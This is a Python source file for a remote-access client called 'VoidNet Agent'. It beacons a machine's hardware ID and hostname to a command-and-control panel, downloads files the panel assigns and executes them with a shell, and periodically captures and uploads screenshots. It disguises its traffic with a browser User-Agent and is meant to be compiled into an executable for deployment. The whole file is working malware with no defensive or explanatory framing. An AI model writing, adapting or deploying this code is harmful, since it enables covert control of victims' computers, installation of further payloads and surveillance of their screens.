import os
import sys
import time
import socket
import uuid
import subprocess
import requests
import keyboard  # pip install keyboard
import psutil    # pip install psutil
from PIL import ImageGrab

# --- Configuration ---
PANEL_URL = "https://example.ex"
CHECKIN_INTERVAL = 5
SCREENSHOT_INTERVAL = 7200
TERMINATE_HOTKEY = "ctrl+alt+q"

# --- API Endpoints ---
API_BASE = f"{PANEL_URL}/api"
CHECKIN_ENDPOINT = f"{API_BASE}/checkin.php"
GET_TASK_ENDPOINT = f"{API_BASE}/get_task.php"
UPLOAD_ENDPOINT = f"{API_BASE}/upload.php"
UPDATE_TASK_ENDPOINT = f"{API_BASE}/update_task.php"

def get_hwid():
    return ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])

def execute_task(session, task):
    task_id = task['id']
    file_url = f"{PANEL_URL}/{task['file_url']}"
    drop_location = task['drop_location']
    status_to_report = 'failed'
    try:
        print(f"Downloading task file from {file_url}...")
        response = session.get(file_url, stream=True, timeout=60)
        response.raise_for_status()
        os.makedirs(drop_location, exist_ok=True)
        file_name = os.path.basename(task['file_url']).split('_', 1)[1]
        file_path = os.path.join(drop_location, file_name)
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"File downloaded to: {file_path}")
        subprocess.Popen(file_path, shell=True)
        print(f"Executed: {file_path}")
        status_to_report = 'completed'
    except Exception as e:
        print(f"Error during task execution: {e}")
    finally:
        try:
            session.post(UPDATE_TASK_ENDPOINT, data={'task_id': task_id, 'status': status_to_report}, timeout=15)
        except Exception as e:
            print(f"Could not report task status: {e}")

def kill_switch():
    print("Termination hotkey pressed. Shutting down.")
    with open(os.path.join(os.environ['TEMP'], 'voidnet_kill.flag'), 'w') as f:
        f.write('terminate')

def main():
    if not getattr(sys, 'frozen', False):
        print("This script is designed to be compiled with PyInstaller.")
        sys.exit(1)

    keyboard.add_hotkey(TERMINATE_HOTKEY, kill_switch, suppress=True)

    hwid = get_hwid()
    machine_name = socket.gethostname()
    last_checkin_time = 0
    last_screenshot_time = 0

    print(f"--- VoidNet Agent Running ---")
    print(f"HWID: {hwid}")
    print(f"Press {TERMINATE_HOTKEY.upper()} to terminate.")

    with requests.Session() as session:
        headers = {"User-Agent": "Mozilla/5.0"}

        while not os.path.exists(os.path.join(os.environ['TEMP'], 'voidnet_kill.flag')):
            current_time = time.time()

            if current_time - last_checkin_time > CHECKIN_INTERVAL:
                try:
                    print("\nChecking in...")
                    session.post(CHECKIN_ENDPOINT, data={'hwid': hwid, 'machine_name': machine_name}, headers=headers, timeout=15)
                    last_checkin_time = current_time

                    task_response = session.post(GET_TASK_ENDPOINT, data={'hwid': hwid}, headers=headers, timeout=15)
                    if task_response.status_code == 200:
                        task_data = task_response.json()
                        if task_data.get('status') == 'task_found':
                            execute_task(session, task_data['task'])

                    if current_time - last_screenshot_time > SCREENSHOT_INTERVAL:
                        screenshot = ImageGrab.grab()
                        screenshot_path = os.path.join(os.environ['TEMP'], 'voidnet_ss.png')
                        screenshot.save(screenshot_path, 'PNG')
                        with open(screenshot_path, 'rb') as f:
                            files = {'screenshot': ('screenshot.png', f, 'image/png')}
                            session.post(UPLOAD_ENDPOINT, data={'hwid': hwid}, files=files, headers=headers, timeout=30)
                        os.remove(screenshot_path)
                        last_screenshot_time = current_time
                except Exception as e:
                    print(f"Error during check-in: {e}")

            time.sleep(1)

if __name__ == "__main__":
    main()
